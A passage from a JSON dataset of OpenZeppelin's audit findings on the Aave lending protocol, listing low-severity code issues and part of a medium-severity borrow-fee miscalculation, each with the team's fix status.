in the second conditional block.\n* Consider using the subscript `s` (instead of `f`) to refer to the stable rate parameters. Since `s` is already used to reference scaling variables, consider using a synonym like multiplier with the subscript m`.\n* Typo in section 2.6: all votes are biding.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11633",
      "title": "[L17] Misleading error messages",
      "impact": "LOW",
      "content": "* The `LendingPoolCore` contracts [fallback function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L646) intends to only allow transfers of ETH from contracts. However, given the current implementation, transfers of ETH would fail with a misleading error message whenever executed from contracts constructors. Consider clarifying such behavior in an inline comment to prevent unexepected behaviors.\n* In [line 463 of `LendingPool.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L463), the error message does not match the actual checked condition, and should therefore be modified to *[] an amount that is equal or smaller than []*.\n* While the error message in [line 610 of `LendingPool.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L610) states that *The caller of this function must be a contract*, the `flashLoan` function can be called by both contracts and externally-owned accounts.\n\n\n**Update**: *Not fixed. The issue is tracked in [#98](https://gitlab.com/aave-tech/dlp/contracts/issues/98).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11632",
      "title": "[L16] Erroneous docstrings and comments",
      "impact": "LOW",
      "content": "Several docstrings and inline comments throughout the code base were found to be erroneous and should be fixed. In particular:\n\n\n* In [lines 93 and 94 of `CoreLibrary.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L93-94) the docstrings for the `getNormalizedIncome` function appear to be [a copy](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L78-81) from the previous function `getReserveUtilizationRate`.\n* [Line 70 of `CoreLibrary.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L70) should say usageAsCollateralEnabled instead of usageAsCollateral.\n* Within the [`borrow` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L175) of the `LendingPool` contract, enumeration of steps in inline comments jump from step [2](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L273) to [4](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L296).\n* Comment in [line 366 of `LendingPool.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L366) should be removed.\n* Comment in [line 641 of `LendingPool.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L641) should say greater or equal instead of greater of equal. Additionally, note that the following `require` statement is just checking for strict equality.\n* [Docstrings for the `burnOnRedeemInternal` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L163) state that only lending pools can call this function. Yet the function is marked as `internal`, and cannot be called from other contracts.\n* [Docstrings for the `repay` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L324) state that repays a borrow [] for the specified amount. Which not always holds true  if the caller specifies an amount equal to `UINT_MAX_VALUE` then the entire borrow is repaid.\n* In the [`ILendingRateOracle` interface](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/interfaces/ILendingRateOracle.sol) all units specified in docstrings should be in Ray instead of Wei.\n* Lines [18](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/interfaces/IPriceOracle.sol#L18) and [23](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/interfaces/IPriceOracle.sol#L23) of `IPriceOracle.sol` should say ETH price instead of asset price.\n* [Line 23 of `LendingPoolLiquidationManager.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L23) should say LendingPoolLiquidationManager instead of LiquidationManager.\n* [Line 33 of `LendingPoolDataProvider.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L33) should say the loan can be liquidated instead of the loan gets liquidated.\n* [Line 144 of `LendingPoolDataProvider.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L144) references a `transferInternal()` function in the `AToken` contract that does not exist.\n\n\n**Update**: *Fixed in [MR#90](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/90/diffs) and [MR#98](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/98/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11631",
      "title": "[L15] Missing comprehensive docstrings",
      "impact": "LOW",
      "content": "Many of the contracts and functions in the code base lack comprehensive documentation. This hinders reviewers understanding of the codes intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. In general, docstrings should explicitly explain the purpose or intention of functions and its parameters, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider consistently following the [Ethereum Natural Specification format](https://solidity.readthedocs.io/en/v0.5.9/natspec-format.html) (NatSpec).\n\n\n**Update**: *The Aave team acknowledges this issue:*\n\n\n\n> \n>  We will make sure to add improved documentation following the NatSpec format.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11630",
      "title": "[L14] Tests not passing",
      "impact": "LOW",
      "content": "After following the instructions in the [README file](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/README.md) of the project, the testing suite finishes with six failing tests. Such tests are:\n\n\n\n```\n- Contract: LendingPool - token economy tests\n- BORROW - Test user cannot borrow using the same currency as collateral\n\n- Contract: LendingPool FlashLoan function\n- FLASH LOAN - Takes ETH Loan, returns the funds correctly:\n\n- Contract: LendingPool FlashLoan function\n- FLASH LOAN - Takes ETH Loan, does not return the funds:\n\n- Contract: LendingPool FlashLoan function\n- FLASH LOAN - Takes out a 500 DAI Loan, returns the funds correctly:\n\n- Contract: LendingPool FlashLoan function\n- FLASH LOAN - Takes out a 500 DAI Loan, does not return the funds:\n\n- Contract: LendingPool liquidation\n- LIQUIDATION - Liquidates the borrow\n\n```\n\nAs the test suite was left outside the audits scope, please consider thoroughly reviewing the test suite to make sure all tests run successfully. Furthermore, it is advisable to only merge code that does not break the existing tests (nor decreases coverage).\n\n\n**Update**: *The Aave team acknowledges this issue, and has now revamped the test suite:*\n\n\n\n> \n>  Test were breaking on the audited commit because of an issue in the migration scripts. As the test system has been completely revamped, these tests are not failing anymore and more than 60 other unit tests have been added.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11629",
      "title": "[L13] Inconsistent validations",
      "impact": "LOW",
      "content": "The [`transferToFeeCollectionAddress`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L661) function of the `LendingPoolCore` contract does not currently prevent users from sending ETH along an ERC20 transfer operation like the [`transferToReserve` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L685) does. To favor consistency and prevent unexpected behaviors, consider implementing this validation in the `transferToFeeCollectionAddress` function.\n\n\n**Update**: *Fixed in [MR#88](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/88/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11628",
      "title": "[L12] Unfulfillable condition",
      "impact": "LOW",
      "content": "The first condition in the [`require` statement in line 211](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L211) of `LendingPool.sol` (inside the `borrow` function), checks whether the user-controlled argument `_interestRateMode` is equal to `uint256(CoreLibrary.InterestRateMode.VARIABLE)`. This is an unfulfillable condition, considering that the [`if` statement in line 207](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L207) already ensures `_interestRateMode` is going to be equal to `uint256(CoreLibrary.InterestRateMode.FIXED)`.\n\n\nTo favor readability and avoid unnecessary validations, consider removing the unfulfillable condition.\n\n\n**Update**: *Fixed in [MR#89](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/89/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11627",
      "title": "[L11] MintOnDeposit event logs amount of underlying asset",
      "impact": "LOW",
      "content": "The [`MintOnDeposit` event](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L94) logs the amount of underlying asset sent instead of the number of aTokens minted. This might be considered intended behavior since the [`_mint` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L93) already [emits a `Transfer` event](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/token/ERC20/ERC20.sol#L175) logging the number of aTokens. However, it is inconsistent with the [data logged in the `Redeem` event](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L83) of the `redeem` function.\n\n\nConsider modifying the `MintOnDeposit` event to log both the amount of the underlying asset sent and the number of aTokens minted.\n\n\n**Update**: *Fixed in [MR#36](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/36/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11626",
      "title": "[L10] Redundant BurnOnRedeem event",
      "impact": "LOW",
      "content": "The [`burnOnRedeemInternal` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L165) of the `AToken` contract emits a `BurnOnRedeem` event that logs the account and the number of tokens burned. However, this immediately follows a call to [OpenZeppelins ERC20 contract `_burn` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/token/ERC20/ERC20.sol#L189) which [emits a `Transfer` event](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/token/ERC20/ERC20.sol#L194) with the same information.\n\n\nTo favor simplicity and avoid redundant operations, consider removing the `BurnOnRedeem` event.\n\n\n**Update**: *Fixed in [`bc43147`](https://gitlab.com/aave-tech/dlp/contracts/commit/bc4314719260425c95bc18664373e4da4fa6bc8e#a817c0eba461f5d46999a76647f0f6e7d4d6dc4e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11625",
      "title": "[L09] Erroneous data logged in Repay event",
      "impact": "LOW",
      "content": "The [`repay` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L329) in the `LendingPool` contract [emits a `Repay` event](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L415) to notify off-chain clients about successful repayments. When a user passes a value higher than the debt (including [`UINT_MAX_VALUE`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L76)) in the [`_amount` parameter](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L331), the function assumes the user is willing to repay the entire borrow (whatever the actual amount to be repaid is). In this scenario, after the successful repayment is completed, the function will emit the `Repay` event logging `_amount` as the repaid amount, where it should actually log the amount effectively paid (*i.e.* `paybackAmount`).\n\n\nConsider modifying the amount logged by the `Repay` event so that it matches the actual amount paid by the user. It should be noted that currently there are no unit tests covering the emission of the `Repay` event and the data it logs. Therefore, consider implementing related unit tests to prevent this error from being reintroduced in future changes to the code base.\n\n\n**Update**: *Fixed in [MR#47](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/47/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11624",
      "title": "[L08] Erroneous data logged in LiquidationCall event",
      "impact": "LOW",
      "content": "The [`liquidationCall` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L574) in the `LendingPool` contract [emits a `LiquidationCall` event](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L599) to notify off-chain clients about successful liquidations. However, it currently logs erroneous data.\n\n\n* While the event logs the `_purchaseAmount` argument passed by the liquidator, this argument can be higher than the actual amount liquidated (as seen in [lines 110 to 114 of `LendingPoolLiquidationManager.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L110-114)). The amount logged should match the actual amount liquidated.\n* The first argument passed to the event should be `_collateral` (instead of `liquidationManager`).\n\n\nIt must be highlighted that currently there are no unit tests covering the emission of the `LiquidationCall` event and the data it logs. Therefore, consider implementing related unit tests to prevent these errors from being reintroduced in future changes to the code base.\n\n\n**Update**: *Fixed in [MR#87](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/87/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11623",
      "title": "[L07] Potential division by zero",
      "impact": "LOW",
      "content": "The [`balanceDecreaseAllowed` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L160) in the `LendingPoolDataProvider` contract is used to validate decreases in an accounts collateral balance. Once it [calculates the collateral balance after the decrease](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L192), the function computes the resulting liquidation threshold. However, in this last calculation [the new collateral balance is used as a divisor](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L197) without previously validating whether it is zero.\n\n\nWhile this does not pose a security issue, since the [`div` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/math/SafeMath.sol#L83) of OpenZeppelin `SafeMath` is used, it should be noted that the division by zero will cause the transaction to revert with an unexpected and not user-friendly error message from the `SafeMath` library. Therefore, to avoid unexpected behaviors, consider returning `false` if the `collateralBalancefterDecrease` variable is zero.\n\n\n**Update**: *Fixed in [MR#85](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/85/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11622",
      "title": "[L06] Collateral can be deposited in a reserve where usage as collateral is disabled",
      "impact": "LOW",
      "content": "The [`deposit` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L90) of the `LendingPool` contract allows users to deposit assets as collateral (by setting the [`_useAsCollateral` parameter](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L93) to `true`) in reserves where usage as collateral may be disabled system-wise. Specifically, in reserves where [`usageAsCollateralEnabled`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L73) is `false`.\n\n\nThis issue does not pose a security risk, as such deposits [will not account for collateral when the reserve is disabled as collateral system-wise](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L106). Yet, such behavior can cause confusion in users. Consider reverting the transaction whenever a user attempts a deposit of assets as collateral (with the `_useAsCollateral` argument set to `true`) in a reserve where usage as collateral is disabled system-wise.\n\n\n**Update**: *Not an issue. The Aave team understands this is the protocols intended behavior:*\n\n\n\n> \n>  The dominant configuration parameter which determines first and foremost if a deposit can be used as collateral is the `usageAsCollateralEnabled`. The `_useAsCollateral` parameter was intended only as a user preference. [By fixing C01] The possibility of setting this preference has been removed from the `deposit` function. We believe that being an user preference, the user should be able to set in wathever way he wants independently from the platform configuration, especially considering that the platform configuration may change in the future. We will make sure to document more in detail this function though to ensure better understanding of the meaning of the flag for users.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11621",
      "title": "[L05] Fixed-rate borrow can be rebalanced in inactive reserve",
      "impact": "LOW",
      "content": "The [`rebalanceFixedBorrowRate` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L493) of the `LendingPool` contract does not validate whether the reserve passed as an argument is active. As a consequence, an inactive reserve can suffer unexpected changes in its parameters.\n\n\nThis issue should be disregarded if the behavior is expected. Otherwise, consider requiring that the reserve is active by means of the [`onlyActiveReserve` modifier](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L71).\n\n\n**Update**: *Fixed in [MR#84](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/84/diffs).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11620",
      "title": "[L04] Redundant underflow prevention",
      "impact": "LOW",
      "content": "[Function `decreaseUserPrincipalBorrowBalance`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L297) unnecessarily implements an underflow protection ensuring that [`user.principalBorrowBalance` is greater or equal than `_amount`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L302). This validation is already in place in [OpenZeppelin SafeMaths `sub` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/math/SafeMath.sol#L42), so consider removing it.\n\n\n**Update**: *Not an issue, as the code correctly follows the Fail early and loudly principle.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11619",
      "title": "[L03] Conversion to aToken units implicitly assumes 18 decimals",
      "impact": "LOW",
      "content": "The [`underlyingAmountToATokenAmount` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L152) of the `AToken` contract never takes into account the decimals of the overlying asset (*i.e.* the aToken). While it works under the assumption that all aTokens have 18 decimals, there is nothing in the code to ensure this assumption always holds.\n\n\nThis issue does not pose a current security risk, as the Aave developers are in control of how many decimals aTokens have. However, the `underlyingAmountToATokenAmount` function should programmatically enforce all conditions needed to operate normally, since dangerous unexpected behavior could arise otherwise.\n\n\nTo favor explicitness and prevent bugs in future modifications to the code base, consider modifying the `underlyingAmountToATokenAmount` function to explicitly account for the decimals of the overlying aToken. Otherwise, warning documentation should be included in the function docstrings. One alternative, less flexible, course of action is to programmatically enforce that all created aTokens have 18 decimals in the [`AToken` contract constructor](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L46).\n\n\n**Update**: *Fixed in [MR#83](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/83/diffs). The `AToken` constructor now programmatically enforces all aTokens to have 18 decimals.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11618",
      "title": "[L02] Truncation when casting Ray to Wad",
      "impact": "LOW",
      "content": "The [`rayToWad` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/WadRayMath.sol#L58) of the `WadRayMath` library truncates the input `Ray` value (with 27 decimal digits of precision) when casting it to a `Wad` value (with only 18 digits of precision). However, the other functions in the library round instead of truncating when discarding precision.\n\n\nConsider creating a second function that rounds to the nearest `Wad`. This could be used in the [`getCompoundedBorrowBalance` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L209) of the `CoreLibrary` to return a slightly more accurate value, favoring accruing more interest for the protocol. The original `rayToWad` functionality in [`underlyingAmountToATokenAmount`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L152) and [`aTokenAmountToUnderlyingAmount`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L126) functions should be kept, as it favors rounding down (truncation) when calculating how many tokens to send *out* of the protocol.\n\n\n**Update**: *Fixed in [MR#82](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/82/diffs). The `rayToWad` function has been modified, and now always rounds to the nearest `Wad`. Note that the applied fix does not strictly follow our suggestion of having two separate functions.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11617",
      "title": "[L01] Minimum interest can be within one block",
      "impact": "LOW",
      "content": "To lessen the impact of potential interest-free loans (refer to the first high-severity issue [in our Compound audit](https://blog.openzeppelin.com/compound-audit/)), the Aave protocol [adds 1 wei as symbolic cumulated interest](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L236-242). However, this mechanism does not check whether time has passed, so it would accrue the symbolic interest in the same block as the loan.\n\n\nBefore adding the symbolic cumulated interest of 1 wei, consider adding a check to ensure that the last updates timestamp is different from the currents block timestamp.\n\n\n**Update**: *Fixed in [MR#81](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/81/diffs). The `getCompoundedBorrowBalance` function now checks the block timestamp before accruing symbolic interest.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11616",
      "title": "[M11] Miscalculation of requested borrow amount in ETH",
      "impact": "MEDIUM",
      "content": "*Note for the reader: This issue was detected during our review of the fixes for the first audit round. The specific commit where the issue was introduced is [`8521bcd`](https://gitlab.com/aave-tech/dlp/contracts/commit/8521bcd6aeee58d57ae4f0eb57b84ef4e0224fce), which was not present in the audited commit. It must be noted that [the PR that finally merged this commit](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/34) to the `master` branch was created and merged by the same author, without any kind of peer-review nor CI testing process. The commit to which we link in the issues description is the latest in the `master` branch at the moment of writing.*\n\n\nTo validate whether there is enough collateral to cover a borrow, the [`borrow` function](https://gitlab.com/aave-tech/dlp/contracts/blob/cf3ba5c501c58efa1d45f4ed9d9e70debff75230/contracts/lendingpool/LendingPool.sol#L211) of the `LendingPool` contract first [calculates how much ETH the amount borrowed represents](https://gitlab.com/aave-tech/dlp/contracts/blob/cf3ba5c501c58efa1d45f4ed9d9e70debff75230/contracts/lendingpool/LendingPool.sol#L253-255). This calculation is intended to take into account the borrow fee paid by the borrower. However, the borrow fee is only [calculated *after* it is first used](https://gitlab.com/aave-tech/dlp/contracts/blob/cf3ba5c501c58efa1d45f4ed9d9e70debff75230/contracts/lendingpool/LendingPool.sol#L303-306). This means that when the requested borrow amount in ETH is calculated, the `vars.borrowFee` variable is zero. As a consequence, the calculated borrow amount in ETH will be lower than expected, inevitably lowering the actual amount of collateral needed in ETH to accept the borrow operation.\n\n\nConsider refactoring the `borrow` function to first calculate the borrow fee, and only then using the `vars.borrowFee` variable for further operations. Note that this issue should have been caught if 